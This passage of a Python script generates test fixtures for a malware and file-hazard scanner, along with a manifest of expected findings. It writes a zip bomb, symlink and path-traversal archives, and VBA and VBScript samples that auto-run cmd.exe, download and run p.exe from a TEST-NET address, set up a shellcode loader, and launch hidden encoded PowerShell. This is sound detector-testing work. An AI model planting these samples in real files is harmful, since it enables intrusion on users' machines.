    z.writestr(zipfile.ZipInfo('bomb.bin', FIXED_ZIP_DT),
               b'\x00' * (16 * 1024 * 1024), zipfile.ZIP_DEFLATED)
write(os.path.join(ARCHIVE_DIR, 'bomb.zip'), buf.getvalue())

# Symlink entry (unix S_IFLNK mode in external attributes)
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as z:
    zi = zipfile.ZipInfo('evil-link', FIXED_ZIP_DT)
    zi.external_attr = (0o120777 << 16)        # S_IFLNK | 0777
    z.writestr(zi, '/etc/passwd')
    z.writestr(zipfile.ZipInfo('readme.txt', FIXED_ZIP_DT), 'ok\n')
write(os.path.join(ARCHIVE_DIR, 'symlink.zip'), buf.getvalue())

# Nested archive — a zip containing another zip
_inner = io.BytesIO()
with zipfile.ZipFile(_inner, 'w') as iz:
    iz.writestr(zipfile.ZipInfo('inner.txt', FIXED_ZIP_DT), 'nested\n')
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('payload.zip', FIXED_ZIP_DT), _inner.getvalue())
    z.writestr(zipfile.ZipInfo('notes.txt', FIXED_ZIP_DT), 'see payload.zip\n')
write(os.path.join(ARCHIVE_DIR, 'nested.zip'), buf.getvalue())

# Path traversal (zip-slip)
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('safe.txt', 'ok\n')
    z.writestr('../../escape.txt', 'pwned\n')
write(os.path.join(ARCHIVE_DIR, 'traversal.zip'), buf.getvalue())

# ─────────────────────────────────────────────────────────────────────────────
# VB-family fixtures (issue #25) — exported VBA modules and VBScript.
# Static text only: nothing here is ever executed, and the "payloads" reference
# TEST-NET-2 (198.51.100.0/24, RFC 5737) and .test names, which are unroutable.
# ─────────────────────────────────────────────────────────────────────────────
write_text(os.path.join(VBA_DIR, 'clean.bas'),
    'Attribute VB_Name = "Formatting"\n'
    'Option Explicit\n'
    '\n'
    'Sub FormatReport()\n'
    '    Dim ws As Worksheet\n'
    '    Set ws = ActiveWorkbook.Sheets(1)\n'
    '    ws.Range("A1").Value = "Quarterly Report"\n'
    'End Sub\n')

write_text(os.path.join(VBA_DIR, 'autoexec.bas'),
    'Attribute VB_Name = "Startup"\n'
    'Option Explicit\n'
    '\n'
    'Sub Auto_Open()\n'
    '    Dim sh As Object\n'
    '    Set sh = CreateObject("WScript.Shell")\n'
    '    sh.Run "cmd.exe /c whoami", 0, False\n'
    'End Sub\n')

write_text(os.path.join(VBA_DIR, 'downloader.bas'),
    'Attribute VB_Name = "Fetch"\n'
    'Option Explicit\n'
    '\n'
    'Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _\n'
    '    Alias "URLDownloadToFileA" (ByVal p As Long, ByVal sURL As String, _\n'
    '    ByVal sFile As String, ByVal d As Long, ByVal cb As Long) As Long\n'
    '\n'
    'Sub GetPayload()\n'
    '    Dim sh As Object\n'
    '    URLDownloadToFile 0, "http://198.51.100.7/p.exe", "C:\\Users\\Public\\p.exe", 0, 0\n'
    '    Set sh = CreateObject("WScript.Shell")\n'
    '    sh.Run "C:\\Users\\Public\\p.exe", 0, False\n'
    'End Sub\n')

write_text(os.path.join(VBA_DIR, 'shellcode.bas'),
    'Attribute VB_Name = "Loader"\n'
    'Option Explicit\n'
    '\n'
    'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, _\n'
    '    ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n'
    'Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, _\n'
    '    ByRef src As Any, ByVal length As Long)\n'
    '\n'
    'Sub Load()\n'
    '    Dim addr As LongPtr\n'
    '    addr = VirtualAlloc(0, 4096, &H3000, &H40)\n'
    'End Sub\n')

write_text(os.path.join(VBA_DIR, 'obfuscated.cls'),
    'VERSION 1.0 CLASS\n'
    'Attribute VB_Name = "Decoder"\n'
    'Option Explicit\n'
    '\n'
    'Public Function Build() As String\n'
    '    Build = Chr(99) & Chr(109) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)\n'
    '    Build = StrReverse(Build)\n'
    'End Function\n')

write_text(os.path.join(VBA_DIR, 'launcher.vbs'),
    'Set sh = CreateObject("WScript.Shell")\n'
    'sh.Run "powershell -nop -w hidden -enc SQBFAFgA", 0, False\n')

write_text(os.path.join(VBA_DIR, 'encoded.vbe'),
    '#@~^ZQAAAA==encoded-by-script-encoder-placeholder\n')

# VBA source hiding under an innocent extension — the classifier must detect it
# by content and the disguise rule must fire (MTS-DISGUISE-002).
write_text(os.path.join(DISGUISED_DIR, 'macro.txt'),
    'Attribute VB_Name = "Hidden"\n'
    'Option Explicit\n'
    '\n'
    'Sub Document_Open()\n'
    '    Dim sh As Object\n'
    '    Set sh = CreateObject("WScript.Shell")\n'
    '    sh.Run "cmd.exe /c whoami", 0, False\n'
    'End Sub\n')

# ─────────────────────────────────────────────────────────────────────────────
# Manifest
# ─────────────────────────────────────────────────────────────────────────────
manifest = {
    "schemaVersion": "0.1.0",
    "fixtures": {
        "python/clean_pkg-1.0-py3-none-any.whl":            {"expectCves": False, "expectSbom": False},
        "python/vulnerable_deps_pkg-1.0-py3-none-any.whl":  {"expectCves": True,  "expectSbom": True},
        "python/corrupt_pkg-1.0-py3-none-any.whl":          {"expectExtractFailure": True},
        "python/traversal_pkg-1.0-py3-none-any.whl":        {"expectFinding": "MTS-EXTRACT-TRAVERSAL"},
        "native/native_clean_pkg-1.0-py3-none-any.whl":     {"expectBinaryFindings": False},
        "native/suspicious_imports_pkg-1.0-py3-none-any.whl": {"expectFinding": "BINARY-SUSPICIOUS-IMPORT"},
        "native/network_native_pkg-1.0-py3-none-any.whl":   {"expectFinding": "BINARY-NETWORK-IMPORT"},
        "native/fake_native_pkg-1.0-py3-none-any.whl":      {"expectFinding": "BINARY-INVALID-FORMAT"},
        "pysource/clean.py":   {"expectBandit": False, "expectSecrets": False},
        "pysource/risky.py":   {"expectBandit": True},
        "pysource/secrets.py": {"expectSecrets": True},
        "notebook/nb_clean.ipynb":     {"expectNotebookFinding": False},
        "notebook/nb_eval.ipynb":      {"expectBanditViaProjection": True},
        "notebook/nb_outputs.ipynb":   {"expectFinding": "NOTEBOOK-SAVED-OUTPUT"},
        "notebook/nb_malformed.ipynb": {"expectFinding": "NOTEBOOK-MALFORMED"},
        "disguised/readme.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "powershell"},
        "disguised/output.log":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "shell"},
        "disguised/data.dat":    {"expectFinding": "MTS-DISGUISE-002", "detectedType": "python"},
        "disguised/notes2.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "batch"},
        "disguised/memo.txt":    {"expectNoDisguise": True},
        "pdf/pdf_clean.pdf":      {"expectActiveContent": False},
        "pdf/pdf_js.pdf":         {"expectFinding": "PDF-JAVASCRIPT"},
        "pdf/pdf_launch.pdf":     {"expectFinding": "PDF-LAUNCH"},
        "pdf/pdf_embedded.pdf":   {"expectFinding": "PDF-EMBEDDED-FILE"},
        "pdf/pdf_encrypted.pdf":  {"expectFinding": "PDF-ENCRYPTED"},
        "pdf/pdf_obfuscated.pdf": {"expectFinding": "PDF-JAVASCRIPT"},
        "pdf/pdf_fake.pdf":       {"expectFinding": "PDF-INVALID-FORMAT"},
        "office/office_clean.docx":    {"expectMacroFindings": False},
        "office/office_macro.docm":    {"expectFinding": "OFFICE-VBA-PRESENT"},
        "office/office_dde.docx":      {"expectFinding": "OFFICE-DDE"},
        "office/office_template.docx": {"expectFinding": "OFFICE-REMOTE-TEMPLATE"},
        "shell/clean.sh":       {"expectRiskyCode": False},
        "shell/remote_exec.sh": {"expectFinding": "SHELL-REMOTE-EXEC"},
        "shell/b64_exec.sh":    {"expectFinding": "SHELL-B64-EXEC"},
        "shell/eval_expand.sh": {"expectFinding": "SHELL-EVAL"},
        "shell/chmod777.sh":    {"expectFinding": "SHELL-CHMOD-777"},
        "shell/hardcoded_ip.sh":{"expectFinding": "SHELL-HARDCODED-IP"},
        "shell/sc_bugs.sh":     {"expectShellCheckFindings": True},
        "powershell/clean.ps1":      {"expectRiskyCode": False},
        "powershell/downloader.ps1": {"expectFinding": "PS-IEX"},
        "powershell/encoded.ps1":    {"expectFinding": "PS-ENCODED-COMMAND"},
        "powershell/amsi.ps1":       {"expectFinding": "PS-AMSI-TAMPER"},
        "powershell/defender.ps1":   {"expectFinding": "PS-DEFENDER-TAMPER"},
        "npm/clean/package.json":      {"expectLifecycle": False},
        "npm/malicious/package.json":  {"expectFinding": "NPM-LIFECYCLE-SCRIPT"},
        "npm/js/evil.js":              {"expectFinding": "NPM-JS-CHILD-PROCESS"},
        "npm/js/clean.js":             {"expectRiskyCode": False},
        "npm/tarball/evil_pkg-1.0.0.tgz": {"expectFinding": "NPM-LIFECYCLE-SCRIPT"},
        "npm/locked/package-lock.json":{"expectOsvOnline": True},
        "python_requirements/clean/requirements.txt":      {"expectOsvOnline": False},
        "python_requirements/unpinned/requirements.txt":   {"expectFinding": "OSV-PYPI-UNPINNED"},
        "python_requirements/hash_pinned/requirements.txt":{"expectOsvOnline": False},
        "python_requirements/vulnerable/requirements.txt": {"expectOsvOnline": True},
        "nuget/clean/Contoso.Fixture.Clean.1.0.0.nupkg":    {"expectOsvOnline": False},
        "nuget/vulnerable/Newtonsoft.Json.12.0.1.nupkg":    {"expectOsvOnline": True},
        "model/safe.pkl":          {"expectDeserialization": False},
        "model/malicious.pkl":     {"expectFinding": "PICKLE-REDUCE"},
        "model/model.safetensors": {"expectFinding": "MODEL-SAFE-FORMAT"},
        "model/model.pt":          {"expectFinding": "PICKLE-REDUCE"},
        "vba/clean.bas":        {"expectRiskyCode": False},
        "vba/autoexec.bas":     {"expectFinding": "VBA-AUTOEXEC-PAYLOAD"},
        "vba/downloader.bas":   {"expectFinding": "VBA-DOWNLOAD-EXEC"},
        "vba/shellcode.bas":    {"expectFinding": "VBA-SHELLCODE-API"},
        "vba/obfuscated.cls":   {"expectFinding": "VBA-OBFUSCATION-CHR"},
        "vba/launcher.vbs":     {"expectFinding": "VBA-POWERSHELL-ENC"},
        "vba/encoded.vbe":      {"expectFinding": "VBA-ENCODED-SOURCE"},
        "disguised/macro.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "vba"},
        "archive/clean.zip":     {"expectHazard": False},
        "archive/bomb.zip":      {"expectFinding": "MTS-EXTRACT-BOMB", "blocked": True},
        "archive/symlink.zip":   {"expectFinding": "MTS-EXTRACT-SYMLINK"},
        "archive/nested.zip":    {"expectFinding": "MTS-EXTRACT-NESTED"},
        "archive/traversal.zip": {"expectFinding": "MTS-EXTRACT-TRAVERSAL", "blocked": True},
    }
}
with open(os.path.join(CORPUS_DIR, 'manifest.json'), 'w') as f:
    json.dump(manifest, f, indent=2)
print(f"  wrote {os.path.join(CORPUS_DIR, 'manifest.json')}")
print('Done.')
